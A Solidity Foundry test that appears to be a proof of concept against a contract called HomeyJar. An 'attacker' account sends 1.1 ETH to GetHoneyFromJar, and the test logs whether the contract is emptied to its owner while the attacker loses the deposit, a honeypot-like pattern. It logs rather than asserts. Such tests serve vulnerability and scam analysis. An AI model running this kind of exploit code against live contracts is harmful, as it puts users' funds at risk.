// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4.sol";

contract HomeyJarTest is Test {
    HomeyJar target;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    uint256 constant INITIAL_CONTRACT_BALANCE = 5 ether;
    uint256 constant ATTACK_AMOUNT = 1.1 ether;

    function setUp() public {
        vm.deal(owner, INITIAL_CONTRACT_BALANCE);
        vm.prank(owner);
        target = new HomeyJar();
        
        // Fund contract with initial balance
        (bool success, ) = payable(address(target)).call{value: INITIAL_CONTRACT_BALANCE}("");
        require(success, "Transfer failed");
        
        // FUND ATTACKER WITH ENOUGH ETHER TO EXECUTE THE ATTACK
        vm.deal(attacker, ATTACK_AMOUNT);
    }

    function test_ArbitraryEthTransfer() public {
        console2.log("--- BEFORE-Trigger GetHoneyFromJar ---");
        uint256 initialContractBalance = address(target).balance;
        uint256 initialAttackerBalance = attacker.balance;
        uint256 initialOwnerBalance = owner.balance;

        console2.log("Contract Balance (before attack):", initialContractBalance);
        console2.log("Attacker Balance (before attack):", initialAttackerBalance);
        console2.log("Owner Balance (before attack):", initialOwnerBalance);

        console2.log("--- Trigger GetHoneyFromJar ---");
        // Execute the attack by calling the vulnerable function
        vm.prank(attacker);
        target.GetHoneyFromJar{value: ATTACK_AMOUNT}();

        console2.log("--- AFTER-Trigger GetHoneyFromJar ---");
        uint256 afterContractBalance = address(target).balance;
        uint256 afterAttackerBalance = attacker.balance;
        uint256 afterOwnerBalance = owner.balance;

        console2.log("Contract Balance (after attack):", afterContractBalance);
        console2.log("Attacker Balance (after attack):", afterAttackerBalance);
        console2.log("Owner Balance (after attack):", afterOwnerBalance);

        bool contractEmptied = afterContractBalance == 0;
        bool attackerLostFunds = afterAttackerBalance == initialAttackerBalance - ATTACK_AMOUNT;
        bool ownerReceivedCorrectly = afterOwnerBalance == initialOwnerBalance + initialContractBalance + ATTACK_AMOUNT;
        bool vulnerabilityExists = contractEmptied && attackerLostFunds && ownerReceivedCorrectly;

        // Differential State Comparison
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: The exploit successfully drained the contract, sent the attacker's ETH, and credited the owner correctly");
        } else {
            console2.log("Vulnerability not Exist: The state changes do not match expected exploit behavior");
        }
    }
}